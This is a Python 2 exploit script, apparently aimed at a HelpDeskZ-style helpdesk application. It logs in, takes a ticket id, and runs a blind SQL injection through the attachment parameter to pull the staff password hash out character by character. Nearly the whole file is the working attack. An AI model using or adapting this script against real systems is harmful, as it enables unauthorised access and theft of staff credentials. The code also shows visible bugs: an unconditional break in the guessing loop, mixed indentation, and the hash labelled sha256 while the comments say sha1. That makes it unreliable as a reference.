import requests
import sys
import string

if( len(sys.argv) < 3):
	print "put proper data like in example, remember to open a ticket before.... "
	print "python helpdesk.py http://192.168.43.162/helpdesk/ myemailtologin@gmail.com password123"
	exit()
EMAIL = sys.argv[2]
PASSWORD = sys.argv[3]

URL = sys.argv[1]

def get_token(content):
	token = content
	if "csrfhash" not in token:
		return "error"
	token = token[token.find('csrfhash" value="'):len(token)]
	if '" />' in token:
		token = token[token.find('value="')+7:token.find('" />')] 
	else:
		token = token[token.find('value="')+7:token.find('"/>')] 
	return token

def get_ticket_id(content):
	ticketid = content
	if "param[]=" not in ticketid:
                return "error"
	ticketid = ticketid[ticketid.find('param[]='):len(ticketid)]
	ticketid = ticketid[8:ticketid.find('"')]
	return ticketid


def main():

    # Start a session so we can have persistant cookies
	session = requests.session()

	r = session.get(URL+"")
	
	#GET THE TOKEN TO LOGIN
        TOKEN = get_token(r.content)
	if(TOKEN=="error"):
		print "cannot find token"
		exit();
    #Data for login 
	login_data = {
		'do': 'login',
		'csrfhash': TOKEN,
		'email': EMAIL,
		'password': PASSWORD,
		'btn': 'Login'
	}

    # Authenticate
	r = session.post(URL+"/?v=login", data=login_data)
    	print (r.content)
    #GET  ticketid
	ticket_id = get_ticket_id(r.content)
	print (ticket_id)
        if(ticket_id=="error"):
                print "ticketid not found, open a ticket first"
		exit()
	## need to update with correct attachment para (attachment&param[]=2) and param (param[]=11)
	target = URL +"?v=view_tickets&action=ticket&param[]="+ticket_id+"&param[]=attachment&param[]=2&param[]=11"
	print (target)


	hash=[]
	chars = list(string.ascii_lowercase) + list(string.digits)
	print(len(chars))
	sha1 = 1
	#sha1 has 40 hexadecimal characters
	while sha1 <= 40:
		for i in chars:
				payload = target + "+and+substr((select+password+from+staff+limit+0,1),{},1)+%3d+'{}'+---".format(sha1,i)
				print(payload)
				response = session.get(payload).content
				#print(response)
				if '404' not in response:
						hash.append(i)
						print 'Password hash: ' + ''.join(hash)
						sha1=sha1+1
				else:
					print('404')
				
				break
 	print "------------------------------------------"	
	print "password: sha256("+str(hash)+")"
	if len(hash) == 0:
		print "Your ticket have to include attachment, probably none attachments found, or prefix is not equal hdz_"
		print "try to submit ticket with attachment"

if __name__ == '__main__':
    main()
